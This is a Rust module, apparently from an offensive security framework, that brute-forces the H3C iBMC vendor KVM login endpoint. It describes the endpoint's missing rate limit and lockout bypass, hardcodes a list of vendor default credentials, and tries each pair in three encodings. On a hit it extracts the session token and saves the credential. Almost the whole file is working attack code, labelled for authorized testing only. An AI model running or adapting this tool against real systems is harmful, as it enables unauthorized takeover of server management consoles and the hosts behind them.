//! H3C iBMC OEM KVM session brute force.
//!
//! H3C iBMC firmware exposes a vendor-specific KVM-session login endpoint at
//!   `POST /api/oem_kvm/session`
//! that:
//!
//!   * accepts credentials in three different encodings — plaintext,
//!     base64, and double-base64 — and silently treats whichever decodes
//!     to a valid string as authoritative;
//!   * returns `200 OK` with an `X-Auth-Token` body field on success and
//!     `401 Unauthorized` on failure;
//!   * has **no rate limiting** (operator confirmed via PoC: thousands of
//!     attempts/sec succeeded with no Retry-After / 429 / lockout);
//!   * is independent of the user-facing :443 web UI lockout state — even
//!     when the standard login is locked, this endpoint still services
//!     attempts.
//!
//! The combination is a complete brute-force-to-virtual-media chain: a
//! discovered KVM credential gives the equivalent of physical console
//! access (mount ISO, BIOS reboot, OS reinstall).
//!
//! This module:
//!   * Tries each `(user, password)` pair in three encodings.
//!   * Honours `Retry-After` if the server *does* surface a 429 (some
//!     hardened builds eventually do).
//!   * Stops on the first successful pair and persists it via the
//!     project-wide credential store.
//!
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{ anyhow, Context, Result };
use base64::Engine;
use colored::*;
use std::time::Duration;

use crate::module::{ Finding, FindingKind, ModuleCtx, ModuleOutcome };
use crate::module_info::{ ModuleInfo, ModuleRank };
use crate::utils::network::{ build_http_client_with, HttpClientOpts };
use crate::utils::{
    cfg_prompt_default,
    cfg_prompt_existing_file,
    cfg_prompt_int_range,
    cfg_prompt_yes_no,
    normalize_target,
};

const DEFAULT_PORT: u16 = 443;
const DEFAULT_PATH: &str = "/api/oem_kvm/session";
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Built-in fallback credential pairs — mostly vendor defaults observed
/// across H3C-OEM hardware deployments. Operators should prefer their own
/// wordlist via `userlist`/`passlist`.
const DEFAULT_CREDS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "Password@_"),
    ("admin", "Password@123"),
    ("admin", "h3capadmin"),
    ("admin", "Admin@9000"),
    ("Administrator", "Admin@9000"),
    ("Administrator", "Administrator"),
    ("sysadmin", "superuser"),
    ("root", "root"),
    ("root", "calvin"),
    ("operator", "operator"),
];

/// Encodings the endpoint accepts. The base64 / double-base64 variants
/// matter because legacy clients post one of these formats and the server
/// normalises them — so a wordlist hit may only fire under a non-plain
/// encoding when the server's password store happens to compare against
/// that decoded form.
#[derive(Clone, Copy, Debug)]
enum Encoding {
    Plain,
    Base64,
    DoubleBase64,
}

impl Encoding {
    fn label(self) -> &'static str {
        match self {
            Encoding::Plain => "plain",
            Encoding::Base64 => "b64",
            Encoding::DoubleBase64 => "b64x2",
        }
    }

    fn encode(self, value: &str) -> String {
        match self {
            Encoding::Plain => value.to_string(),
            Encoding::Base64 => base64::engine::general_purpose::STANDARD.encode(value),
            Encoding::DoubleBase64 => {
                let once = base64::engine::general_purpose::STANDARD.encode(value);
                base64::engine::general_purpose::STANDARD.encode(once)
            }
        }
    }
}

fn display_banner() {
    if crate::utils::is_batch_mode() { return; }
    crate::mprintln!("{}", "╔══════════════════════════════════════════════════════════════╗".red());
    crate::mprintln!("{}", "║   H3C iBMC OEM KVM Session Brute Force                       ║".red().bold());
    crate::mprintln!("{}", "║   POST /api/oem_kvm/session — no rate limit on default builds║".red());
    crate::mprintln!("{}", "║   Tries plain / base64 / double-base64 credential encodings  ║".red());
    crate::mprintln!("{}", "║   FOR AUTHORIZED TESTING ONLY                                ║".red());
    crate::mprintln!("{}", "╚══════════════════════════════════════════════════════════════╝".red());
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "H3C iBMC OEM KVM Session Brute Force".to_string(),
        description: "Brute-forces the H3C iBMC vendor-specific KVM session login at \
                      POST /api/oem_kvm/session, which has no rate limiting on default \
                      firmware builds. Tests every (user, password) pair in plaintext, \
                      base64, and double-base64 encodings — the endpoint silently accepts \
                      all three. A successful hit yields an X-Auth-Token that grants \
                      virtual-media + reboot equivalents (full host compromise)."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/".to_string(),
            "https://cwe.mitre.org/data/definitions/307.html".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: None,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("h3c_oem_kvm_bruteforce requires a single-host target")?;

    display_banner();

    let mut outcome = ModuleOutcome::ok();
    let normalized = normalize_target(target)?;
    let host_input = if normalized.is_empty() {
        return Err(anyhow!("target is required"));
    } else {
        normalized
    };

    let port = cfg_prompt_int_range("port", "Target port", DEFAULT_PORT as i64, 1, 65535).await? as u16;
    let path = cfg_prompt_default("path", "API path", DEFAULT_PATH).await?;
    let timeout_secs = cfg_prompt_int_range("timeout", "Per-attempt timeout (seconds)", DEFAULT_TIMEOUT_SECS as i64, 1, 60).await? as u64;
    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try the built-in default credential list?", true).await?;
    let load_user_wordlist = cfg_prompt_yes_no("user_wordlist", "Load a username wordlist?", false).await?;
    let user_path = if load_user_wordlist {
        Some(cfg_prompt_existing_file("userlist", "Path to username wordlist").await?)
    } else { None };
    let load_pass_wordlist = cfg_prompt_yes_no("pass_wordlist", "Load a password wordlist?", false).await?;
    let pass_path = if load_pass_wordlist {
        Some(cfg_prompt_existing_file("passlist", "Path to password wordlist").await?)
    } else { None };
    let try_all_encodings = cfg_prompt_yes_no("try_all_encodings", "Try plain + base64 + double-base64 for each pair?", true).await?;
    let stop_on_hit = cfg_prompt_yes_no("stop_on_hit", "Stop on first valid credential?", true).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose (log each attempt)", false).await?;

    // Build the candidate list.
    let mut pairs: Vec<(String, String)> = Vec::new();
    if use_defaults {
        for (u, p) in DEFAULT_CREDS { pairs.push((u.to_string(), p.to_string())); }
    }
    if let (Some(ufile), Some(pfile)) = (user_path.as_ref(), pass_path.as_ref()) {
        let users = read_lines(ufile).await?;
        let passwords = read_lines(pfile).await?;
        for u in &users {
            for p in &passwords {
                pairs.push((u.clone(), p.clone()));
            }
        }
    } else if let Some(pfile) = pass_path.as_ref() {
        let passwords = read_lines(pfile).await?;
        let users: Vec<&str> = if user_path.is_some() {
            return Err(anyhow!("internal: user_path branch handled above"));
        } else {
            // Default to "admin" if only a password wordlist was given.
            vec!["admin"]
        };
        for u in &users {
            for p in &passwords {
                pairs.push((u.to_string(), p.clone()));
            }
        }
    } else if let Some(ufile) = user_path.as_ref() {
        let users = read_lines(ufile).await?;
        for u in &users {
            pairs.push((u.clone(), "admin".to_string()));
            pairs.push((u.clone(), "password".to_string()));
            pairs.push((u.clone(), u.clone()));
        }
    }

    if pairs.is_empty() {
        return Err(anyhow!("no candidate credentials configured — pick at least defaults or a wordlist"));
    }

    let encodings: Vec<Encoding> = if try_all_encodings {
        vec![Encoding::Plain, Encoding::Base64, Encoding::DoubleBase64]
    } else {
        vec![Encoding::Plain]
    };

    let host = format!("{}:{}", strip_scheme(&host_input), port);
    let client = build_http_client_with(
        Duration::from_secs(timeout_secs),
        HttpClientOpts::permissive_unconditional(),
    ).context("Failed to build HTTP client")?;

    crate::mprintln!("{}", format!(
        "[*] Target: https://{}{}  ({} pair(s) × {} encoding(s) = {} attempts)",
        host, path, pairs.len(), encodings.len(), pairs.len() * encodings.len(),
    ).cyan());

    let mut found: Vec<(String, String, Encoding, String)> = Vec::new();
    let mut tried = 0u64;
    'outer: for (user, pass) in &pairs {
        for enc in &encodings {
            if ctx.is_cancelled() { break 'outer; }
            tried += 1;
            ctx.rate_limit(target).await;
            if let Some(token) = try_login(&client, &host, &path, user, pass, *enc).await {
                crate::mprintln!("{}", format!(
                    "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
                    user, pass, enc.label(), token
                ).green().bold());
                if crate::cred_store::store_credential(crate::cred_store::NewCred {
                    host: &host, port, service: "https", username: user, secret: pass,
                    cred_type: crate::cred_store::CredType::Password,
                    source_module: "creds/generic/h3c_oem_kvm_bruteforce",
                }).await.is_none() { eprintln!("[!] Failed to store credential"); }
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Credential,
                    message: format!("H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}", user, pass, enc.label(), host),
                    data: Some(serde_json::json!({
                        "service": "https",
                        "port": port,
                        "username": user,
                        "password": pass,
                        "encoding": enc.label(),
                        "token": token,
                    })),
                });
                found.push((user.clone(), pass.clone(), *enc, token));
                if stop_on_hit { break 'outer; }
            } else if verbose {
                crate::mprintln!("{}", format!(
                    "[-] {}:{} ({}) — denied", user, pass, enc.label()
                ).dimmed());
            }
        }
    }

    crate::mprintln!();
    crate::mprintln!("{}", format!(
        "[*] {} attempts; {} valid credential(s)",
        tried, found.len()
    ).cyan().bold());

    if found.is_empty() {
        crate::mprintln!("{}", "[-] No valid credentials found.".yellow());
    }

    Ok(outcome)
}

/// Single login attempt. Returns `Some(token)` on success, `None` on any
/// kind of failure (including 429 — caller may chose to honor Retry-After,
/// but on default builds the endpoint never returns one).
async fn try_login(
    client: &reqwest::Client,
    host: &str,
    path: &str,
    user: &str,
    pass: &str,
    enc: Encoding,
) -> Option<String> {
    let url = format!("https://{}{}", host, path);
    let form = [
        ("username", enc.encode(user)),
        ("password", enc.encode(pass)),
        ("free_login", "1".to_string()),
        ("log_type", "1".to_string()),
    ];

    let resp = client.post(&url).form(&form).send().await.ok()?;
    let status = resp.status();
    if status.as_u16() == 429 {
        if let Some(retry) = resp.headers().get("Retry-After")
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.parse::<u64>().ok())
        {
            tokio::time::sleep(Duration::from_secs(retry.min(60))).await;
        }
        return None;
    }
    if !status.is_success() {
        return None;
    }
    let body = resp.text().await.ok()?;
    if !body.contains("X-Auth-Token") {
        return None;
    }
    // Surface the token if we can extract it; otherwise mark hit with a
    // placeholder so the caller still records the credential.
    extract_token(&body).or_else(|| Some("(present)".into()))
}

fn extract_token(body: &str) -> Option<String> {
    let needle = "X-Auth-Token";
    let pos = body.find(needle)?;
    let after = &body[pos + needle.len()..];
    let colon = after.find(':')?;
    let mut value_start = colon + 1;
    let bytes = after.as_bytes();
    while value_start < bytes.len() && bytes[value_start].is_ascii_whitespace() {
        value_start += 1;
    }
    if value_start >= bytes.len() { return None; }
    let rest = &after[value_start..];
    if let Some(stripped) = rest.strip_prefix('"') {
        let val: String = stripped.chars().take_while(|c| *c != '"').collect();
        if val.is_empty() { None } else { Some(val) }
    } else {
        let val: String = rest.chars().take_while(|c| !c.is_whitespace() && *c != ',' && *c != '}').collect();
        if val.is_empty() { None } else { Some(val) }
    }
}

async fn read_lines(path: &str) -> Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await
        .with_context(|| format!("read {}", path))?;
    Ok(content.lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect())
}

fn strip_scheme(host: &str) -> String {
    let mut t = host.trim().to_string();
    for prefix in &["https://", "http://"] {
        if let Some(stripped) = t.strip_prefix(prefix) {
            t = stripped.to_string();
            break;
        }
    }
    if let Some(slash) = t.find('/') { t.truncate(slash); }
    if let Some(colon) = t.find(':') { t.truncate(colon); }
    t
}

crate::register_native_module!(crate::module::Category::Creds, "generic/h3c_oem_kvm_bruteforce", native);
